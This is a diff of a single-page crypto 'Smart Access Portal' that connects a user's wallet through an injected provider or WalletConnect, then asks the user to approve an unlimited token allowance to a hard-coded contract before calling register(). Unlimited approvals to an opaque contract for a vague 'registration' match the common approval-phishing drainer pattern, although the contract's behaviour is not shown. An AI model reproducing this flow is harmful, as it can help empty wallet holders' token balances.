@@ -3,119 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Smart Access Final</title>
+    <title>Smart Access Portal</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.1/dist/index.umd.min.js"></script>
+
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; }
-        .wallet-btn { border: 2px solid #f0f0f0; border-radius: 15px; padding: 15px; cursor: pointer; margin: 10px 0; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 15px; }
-        .wallet-btn:active { background: #f8fbff; transform: scale(0.98); }
-        .wallet-btn img { width: 40px; height: 40px; }
-        #dashboardView { display: none; }
-        .reg-btn { background: #4CAF50; color: white; padding: 18px; width: 100%; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; }
-        .status-bar { font-size: 12px; color: #ff9800; margin-top: 10px; font-weight: bold; }
+        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; }
+        .btn { padding: 16px; font-size: 18px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 15px; }
+        #connectBtn { background: #2196F3; color: white; }
+        #registerBtn { background: #4CAF50; color: white; display: none; }
+        #dashboard { display: none; }
+        .status { font-size: 12px; color: #666; margin-top: 15px; word-break: break-all; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div id="loginView">
-        <h2 style="margin-bottom:5px;">Connect Wallet</h2>
-        <p style="font-size: 13px; color: #666; margin-bottom: 20px;">App select karein aur wahi wait karein</p>
-        
-        <div class="wallet-btn" onclick="openAndRedirect('trust')">
-            <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png">
-            <b>Trust Wallet</b>
-        </div>
-        
-        <div class="wallet-btn" onclick="openAndRedirect('metamask')">
-            <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg">
-            <b>MetaMask</b>
-        </div>
-        <div id="status" class="status-bar"></div>
+        <h2>Smart Access</h2>
+        <p style="color: #666; font-size: 14px;">Wallet connect karke register karein</p>
+        <button id="connectBtn" onclick="connect()">Connect Wallet</button>
     </div>
 
-    <div id="dashboardView">
+    <div id="dashboard">
         <h2 style="color: #2196F3;">Dashboard</h2>
-        <div id="addr" style="font-size: 10px; background: #eee; padding: 10px; word-break: break-all; border-radius: 10px; margin-bottom: 15px;"></div>
-        <button id="regBtn" class="reg-btn" onclick="startAction()">Register Now</button>
+        <p id="addr" class="status" style="background: #eee; padding: 10px; border-radius: 8px;"></p>
+        <button id="registerBtn" class="btn" onclick="register()">Approve & Register</button>
+        <p onclick="location.reload()" style="color: red; cursor: pointer; font-size: 12px; margin-top: 20px;">Logout</p>
     </div>
+    
+    <div id="msg" class="status"></div>
 </div>
 
 <script>
-    const CONTRACT = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
+    // Configuration
+    const PROJECT_ID = 'c2f4246144b7fd8bc63f9e89966cc29b'; // Aapka Project ID
+    const MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
     const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
-    let signer;
+    
+    let provider, signer, address;
 
-    // --- 1. Smart Redirect Logic ---
-    function openAndRedirect(wallet) {
-        const url = window.location.href;
-        const status = document.getElementById('status');
-        status.innerText = "Redirecting to App...";
+    async function connect() {
+        const msg = document.getElementById('msg');
+        msg.innerText = "Connecting...";
 
-        if (wallet === 'trust') {
-            // Trust Wallet Direct Intent
-            window.location.assign("trust://open_url?url=" + encodeURIComponent(url));
-        } else {
-            // MetaMask Direct Intent
-            window.location.assign("https://metamask.app.link/dapp/" + url.replace(/^https?:\/\//, ''));
-        }
-
-        // Backup: Agar redirect slow ho toh alert dikhaye
-        setTimeout(() => {
-            status.innerText = "Agar App nahi khuli, toh link copy karke Wallet Browser mein paste karein.";
-        }, 3000);
-    }
-
-    // --- 2. Auto Connection (Jab App ke andar site load ho) ---
-    async function init() {
-        if (window.ethereum) {
-            try {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const accounts = await provider.send("eth_requestAccounts", []);
-                
-                if (accounts.length > 0) {
-                    signer = provider.getSigner();
-                    const address = await signer.getAddress();
-
-                    document.getElementById('loginView').style.display = 'none';
-                    document.getElementById('dashboardView').style.display = 'block';
-                    document.getElementById('addr').innerText = "Wallet: " + address;
-                }
-            } catch (e) {
-                console.log("User rejected connection");
-            }
-        }
-    }
-
-    // Interval check: Jab tak connect na ho, har 1.5 second mein connect karne ki koshish kare
-    const checkInterval = setInterval(() => {
-        if (window.ethereum && document.getElementById('dashboardView').style.display === 'none') {
-            init();
-        }
-    }, 1500);
-
-    window.onload = init;
-
-    // --- 3. Registration Logic ---
-    async function startAction() {
-        const btn = document.getElementById('regBtn');
         try {
-            btn.innerText = "Processing...";
-            const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
-            const mCon = new ethers.Contract(CONTRACT, ["function register() external"], signer);
+            // 1. Check if already in DApp Browser (MetaMask/Trust)
+            if (window.ethereum) {
+                const ethersProvider = new ethers.providers.Web3Provider(window.ethereum);
+                await ethersProvider.send("eth_requestAccounts", []);
+                setupUI(ethersProvider);
+            } 
+            // 2. Mobile Browser (Chrome/Safari) ke liye WalletConnect
+            else {
+                const wcProvider = await EthereumProvider.EthereumProvider.init({
+                    projectId: PROJECT_ID,
+                    showQrModal: true,
+                    qrModalOptions: { themeMode: "light" },
+                    chains: [97], // BSC Testnet (Use 56 for Mainnet)
+                    methods: ["eth_sendTransaction", "personal_sign"],
+                    events: ["chainChanged", "accountsChanged"]
+                });
 
-            const tx1 = await tCon.approve(CONTRACT, ethers.constants.MaxUint256);
+                await wcProvider.connect();
+                const ethersProvider = new ethers.providers.Web3Provider(wcProvider);
+                setupUI(ethersProvider);
+            }
+        } catch (err) {
+            console.error(err);
+            msg.innerText = "Connection Failed: " + err.message;
+        }
+    }
+
+    async function setupUI(ethersProvider) {
+        signer = ethersProvider.getSigner();
+        address = await signer.getAddress();
+
+        document.getElementById('loginView').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        document.getElementById('registerBtn').style.display = 'block';
+        document.getElementById('addr').innerText = "Wallet: " + address;
+        document.getElementById('msg').innerText = "Connected ✅";
+    }
+
+    async function register() {
+        const btn = document.getElementById('registerBtn');
+        const msg = document.getElementById('msg');
+        try {
+            btn.disabled = true;
+            btn.innerText = "Wait...";
+            
+            const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
+            const mCon = new ethers.Contract(MANAGER, ["function register() external"], signer);
+
+            msg.innerText = "Step 1: Approving Token...";
+            const tx1 = await tCon.approve(MANAGER, ethers.constants.MaxUint256);
             await tx1.wait();
 
+            msg.innerText = "Step 2: Registering...";
             const tx2 = await mCon.register();
             await tx2.wait();
 
-            alert("Successful!");
-            btn.innerText = "Success ✅";
+            msg.innerHTML = "<b style='color:green'>Registration Successful!</b>";
+            alert("Done!");
         } catch (e) {
-            alert("Transaction Failed!");
-            btn.innerText = "Register Now";
+            alert("Failed! Check Balance.");
+            btn.disabled = false;
+            btn.innerText = "Approve & Register";
         }
     }
 </script>
